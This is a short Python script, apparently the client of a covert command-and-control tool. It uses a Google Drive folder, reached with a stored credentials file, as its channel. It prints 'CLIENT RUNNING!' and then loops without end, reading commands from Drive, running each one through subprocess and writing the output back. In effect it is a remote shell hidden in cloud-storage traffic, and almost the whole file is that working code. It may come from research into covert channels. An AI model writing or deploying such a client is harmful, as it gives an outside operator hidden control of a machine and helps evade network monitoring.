
import sys
import os
from pathlib import Path


project_root = Path().resolve().parent  # or manually set it
sys.path.append(str(project_root)) #Sets the path root to be the hash-cc folder in the project

from protocol.outdated.metadata_batch_protocol import *  
from src.mediums.drive_filesystem import *

import subprocess

import sys



fs = GoogleDriveFilesystem("./creds/arif_credentials.json", "19pNkpHor_zX06PSpp7msF9CbxVpyGQJ4")
cc = MetadataProtocol(fs)

print("CLIENT RUNNING!")

while True:
    cmd = cc.read()
    cmd_args = cmd.decode().strip().split()
    sub = subprocess.run(cmd_args,capture_output=True)
    out = sub.stdout
    cc.write(out)
